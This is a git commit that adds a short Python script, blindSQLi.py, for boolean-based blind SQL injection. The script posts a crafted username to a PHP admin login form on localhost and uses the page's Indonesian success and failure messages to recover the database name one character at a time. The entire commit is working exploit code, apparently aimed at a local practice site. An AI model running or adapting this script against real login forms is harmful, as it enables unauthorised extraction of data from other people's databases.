dd1ad118fff54514a306a788dab98c2b86a8e23e
Nandang Prayogi <58286951+nandangpy@users.noreply.github.com>
2021-03-28 09:31:08 +0700

    Blind SQLi dumn
    -

---
+++ blindSQLi.py
@@ -0,0 +1,22 @@
+import requests
+import sys
+
+url = 'http://localhost/admin_login.php'
+
+for i in range(1, 20):
+  for c in range(0x20, 0x7f):
+    username = "xxx' OR BINARY substring(database(),%d,1)= '%s'-- " %(i, chr(c))
+    password = "12345"
+            
+    form = {'username': username, 'password': password, 'submit': 'Login'}
+    response = requests.post(url, data=form)
+     
+    if "Halaman administrasi blog" in response.text:
+      status = True
+    elif "Username atau password salah!" in response.text:
+      status = False
+             
+    if status == True:
+      print chr(c)
+      break
+		
